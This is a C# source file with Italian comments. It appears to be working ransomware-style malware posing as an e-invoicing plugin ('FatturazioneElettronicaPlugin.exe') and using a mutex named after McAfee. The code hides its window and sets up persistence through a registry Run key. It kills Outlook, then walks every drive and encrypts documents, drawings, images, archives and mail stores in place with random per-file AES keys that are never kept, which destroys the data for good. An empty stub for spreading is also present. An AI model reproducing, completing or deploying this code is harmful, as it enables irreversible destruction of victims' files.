using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Principal;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


namespace Fattura
{
    internal class Program
    {


        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        private const int SW_HIDE = 0;
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();


        static Mutex mutex = new Mutex(true, "McAfeeServiceDLL");



        static void Main(string[] args)
        {





            if (mutex.WaitOne(TimeSpan.Zero, true))
            {
                try
                {
                    // Mutex non presente

                   

                    IntPtr consoleHandle = GetConsoleWindow();
                    ShowWindow(consoleHandle, SW_HIDE);   


                    persistenza();


                    
                    DriveInfo[] drives = DriveInfo.GetDrives();

                    
                    foreach (DriveInfo drive in drives)
                    {
                        if (drive.IsReady)
                        {
                            Console.WriteLine($"Nome: {drive.Name}");
                            string rootDirectory = drive.Name;
                            
                            
                            Criptafile(rootDirectory);

                        }

                    }









                }
                finally
                {
                    mutex.ReleaseMutex();
                }
            }
            else
            {
                // Il mutex presente--->exit
            }
     

        }


        static void persistenza()
        {

            //copia di se stesso sotto %userProfile%\FatturazioneElettronica.exe

            string currentFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string userProfilePath = Environment.GetEnvironmentVariable("USERPROFILE");
            string destFilePath = userProfilePath + @"\FatturazioneElettronicaPlugin.exe";

            try
            {
               File.Copy(currentFilePath, destFilePath, true);


                try
                {
              

                    string keyName = "FatturazioneElettronicaPlugin";
                    string applicationPath = @"%userprofile%\FatturazioneElettronicaPlugin.exe";
                    using (RegistryKey runKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        runKey.SetValue(keyName, applicationPath, RegistryValueKind.ExpandString); // Set the value type to REG_SZ
                    }

                }
                catch (Exception ex)
                {
                    //
                    //Console.Write(ex);
                }


            }
            catch (Exception ex)
            {
                //
                Console.Write(ex);
            }



        }






        static string ChiaveRandom(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789#@?&-_";
            Random random = new Random();

            char[] key = new char[length];
            for (int i = 0; i < length; i++)
            {
                key[i] = chars[random.Next(chars.Length)];
            }

            return new string(key);
        }



        static void Criptafile(string directory)
        {
            try
            {
                string[] files = Directory.GetFiles(directory);

                string escluso = "Windows";  // esclude il path Windows (più veloce)
                if (!directory.Contains (escluso))
                {
                    string est = "";
                    foreach (string file in files)
                    {

                        //controllo estensioni
                        est = Path.GetExtension(file).ToLower();


                        //caricamento arry stringhe
                        string[] estensioni = new string[]
                        {
                        ".txt",
                        ".doc",
                        ".docx",
                        ".xls",
                        ".xlsx",
                        ".zip",
                        ".rar",
                        ".pdf",
                        ".dwg",
                        ".bak",
                        ".dxf",
                        ".xpwe",
                        ".pwe",
                        ".edf",
                        ".rvt",
                        ".tm",
                        ".hsbim",
                        ".jpg",
                        ".jpeg",
                        ".png",
                        ".dot",
                        ".rtf",
                        ".dcf",
                        ".xml",
                        ".ost",
                        ".pst"
                        };


                        int indice = Array.IndexOf(estensioni, est);
                        if (indice != -1)
                        {

                            //verifica se il processo outlook è chiuso per le esentsioni ost e pst e 
                            //continua a cifrare
                            if (est == ".ost" || est == ".pst")
                            {
                                Process[] processes = Process.GetProcessesByName("OUTLOOK");
                                if (processes.Length > 0)
                                {
                                    foreach (Process process in processes)
                                    {
                                        process.Kill();
                                    }
                                }


                            }

                          
                            string randomKey = ChiaveRandom(32); 
                            Console.WriteLine("Elaborato:" + file + " >> " + randomKey);


                            Cripta(file, randomKey);
                        }



                    }

                    string[] subDirectories = Directory.GetDirectories(directory);
                    foreach (string subDirectory in subDirectories)
                    {
                        Criptafile(subDirectory);
                    }

                }
                
            }
            catch (Exception e)
            {
                // eccezioni
            }
        }




        static void Cripta(string filePath, string encryptionKey)
        {
            try
            {
                byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(encryptionKey);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = keyBytes;
                    aes.IV = new byte[16]; 

                    // Leggi il contenuto del file
                    byte[] fileBytes = File.ReadAllBytes(filePath);

                    // Cifra il contenuto del file
                    byte[] encryptedBytes = null;
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(fileBytes, 0, fileBytes.Length);
                            cryptoStream.FlushFinalBlock();
                            encryptedBytes = memoryStream.ToArray();
                        }
                    }

                    //file cifrato temporaneo
                    string encryptedFilePath = filePath + ".temp";
                    File.WriteAllBytes(encryptedFilePath, encryptedBytes);

                    // Rimuovi il file originale
                    File.Delete(filePath);

                    //conserva l'estensione principale eliminando il temp e richiamandolo come l'originale 
                    File.Copy(filePath + ".temp", filePath);
                    File.Delete(filePath + ".temp");




                }
            }
            catch (Exception e)
            {
                // Gestione delle eccezioni
               
            }
        }


        //====================================================================================
        //====================================================================================
        //====================================================================================

        static void propaga()
        {

           

            bool isAdmin = IsUserAdministrator();

            if (isAdmin)
            {
                


            }
            else
            {
               

            }

          



        }

        static bool IsUserAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }



    }

}


